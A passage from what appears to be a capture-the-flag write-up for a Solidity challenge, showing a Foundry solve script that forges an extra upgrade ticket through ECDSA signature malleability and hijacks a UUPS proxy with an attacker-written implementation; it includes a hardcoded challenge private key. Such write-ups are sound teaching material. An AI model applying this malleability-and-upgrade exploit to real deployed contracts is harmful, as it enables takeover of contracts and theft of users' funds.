    address issuer = tx.origin;
    PASKATicket memory kernelUpdateRequest = _consumePASKATicket(issuer);
    emit AuthorizedKernelUpgrade(_newImplementation);
}
~~~
It turns out, we can simply use our one ticket to point the proxy to our own implementation, and use that implementation to write to storage how we see fit. Thus, in summary, our exploit is as follows.
- Use signature malleability to create a new ticket for ourselves
- Expend the ticket to "upgrade" the contract to our own implementation
- Use our own implementation to fulfil the solve critera.

{{< collapsetabs "Solve Script" >}}
{{< tabs tabTotal="2" >}}
{{% tab tabName="SolveScript.sol" %}}
~~~solidity
import "forge-std/Script.sol";
import "../src/Setup.sol";
import "../src/OurStargazerKernel.sol";
import "../src/Stargazer.sol";
import "../src/StargazerKernel.sol";


contract MyScript is Script {


    function manipulateSignature(bytes memory signature) public pure returns(bytes memory) {
        (uint8 v, bytes32 r, bytes32 s) = splitSignature(signature);

        uint8 manipulatedV = v % 2 == 0 ? v - 1 : v + 1;
        uint256 manipulatedS = modNegS(uint256(s));
        bytes memory manipulatedSignature = abi.encodePacked(r, bytes32(manipulatedS), manipulatedV);

        return manipulatedSignature;
    }

    function splitSignature(bytes memory sig) public pure returns (uint8 v, bytes32 r, bytes32 s) {
        require(sig.length == 65, "Invalid signature length");
        assembly {
            r := mload(add(sig, 32))
            s := mload(add(sig, 64))
            v := byte(0, mload(add(sig, 96)))
        }
        if (v < 27) {
            v += 27;
        }
        require(v == 27 || v == 28, "Invalid signature v value");
    }

    function modNegS(uint256 s) public pure returns (uint256) {
  
        uint256 n = 0xfffffffffffffffffffffffffffffffebaaedce6af48a03bbfd25e8cd0364141;        
        return n - s;
    }

    function run() external {
        uint256 deployerPrivateKey = 0x5a3b6f509474cfae2074093a5609cee7f37fa3613c3e952c601f44eee5bf1ee7;  //fill private key
        address setupAddr = 0x52fcC866a34f7bACe7d90198aaE5dCb35663eD66;     //fill setup address
        vm.startBroadcast(deployerPrivateKey);

        Setup sp = Setup(setupAddr);
        StargazerKernel proxy = StargazerKernel(0x50F37a51e5b0AA379e66651A82eC5e5c6dc552DC); //fill target address
        bytes memory a = hex"c5e4997efeca9f3f5b70f5f7fbbdea614b53055e9189cc7448ca397c2dfa15e71be89a1b91381c104a63d46b3594228a5ccf48548945aca704f667f08fb37c741c";
        proxy.createPASKATicket(manipulateSignature(a));
        OurStargazerKernel osk = new OurStargazerKernel();
        address(proxy).call(abi.encodeWithSignature("upgradeToAndCall(address,bytes)", address(osk), abi.encodeWithSignature("wahoo()")));
        osk = OurStargazerKernel(address(proxy));
        osk.commitStarSighting("Nova-GLIM_007");
        osk.commitStarSighting("Starry-SPURR_001");
        osk.commitStarSighting("Nova-GLIM_007");
        osk.commitStarSighting("Starry-SPURR_001");
        sp.isSolved();

        vm.stopBroadcast();
    }
}
~~~
{{% /tab %}}
{{% tab tabName="OurStargazerKernel.sol" %}}
~~~solidity
contract OurStargazerKernel is UUPSUpgradeable {
    // keccak256(abi.encode(uint256(keccak256("htb.storage.Stargazer")) - 1)) & ~bytes32(uint256(0xff));
    bytes32 private constant __STARGAZER_MEMORIES_LOCATION = 0x8e8af00ddb7b2dfef2ccc4890803445639c579a87f9cda7f6886f80281e2c800;
    
    /// @custom:storage-location erc7201:htb.storage.Stargazer
    struct StargazerMemories {
        uint256 originTimestamp; 
        mapping(bytes32 => uint256[]) starSightings;
        mapping(bytes32 => bool) usedPASKATickets;
        mapping(address => KernelMaintainer) kernelMaintainers;
    }

    struct KernelMaintainer {
        address account;
        PASKATicket[] PASKATickets;
        uint256 PASKATicketsNonce;
    }

    struct PASKATicket {
        bytes32 hashedRequest;
        bytes signature;
    }

    event PASKATicketCreated(PASKATicket ticket);
    event StarSightingRecorded(string starName, uint256 sightingTimestamp);
    event AuthorizedKernelUpgrade(address newImplementation);

    function initialize(string[] memory _pastStarSightings) public initializer onlyProxy {
        StargazerMemories storage $ = _getStargazerMemory();
        $.originTimestamp = block.timestamp;
        $.kernelMaintainers[tx.origin].account = tx.origin;
        for (uint256 i = 0; i < _pastStarSightings.length; i++) {
            bytes32 starId = keccak256(abi.encodePacked(_pastStarSightings[i]));
            $.starSightings[starId].push(block.timestamp);
        }
    }

    function wahoo() public {
        uint a = 1;
    }

    function commitStarSighting(string memory _starName) public onlyProxy {
        address author = tx.origin;
        StargazerMemories storage $ = _getStargazerMemory();
        bytes32 starId = keccak256(abi.encodePacked(_starName));
        uint256 sightingTimestamp = block.timestamp;
        $.starSightings[starId].push(sightingTimestamp);
        emit StarSightingRecorded(_starName, sightingTimestamp);
    }

    function getStarSightings(string memory _starName) public view onlyProxy returns (uint256[] memory) {
        StargazerMemories storage $ = _getStargazerMemory();
        bytes32 starId = keccak256(abi.encodePacked(_starName));
        return $.starSightings[starId];
    }

    function _getStargazerMemory() private view onlyProxy returns (StargazerMemories storage $) {
        assembly { $.slot := __STARGAZER_MEMORIES_LOCATION }
    }


    function _authorizeUpgrade(address _newImplementation) internal override onlyProxy {
        address issuer = tx.origin;
        emit AuthorizedKernelUpgrade(_newImplementation);
    }
}
~~~
{{% /tab %}}
{{< /tabs >}}
{{< /collapsetabs >}}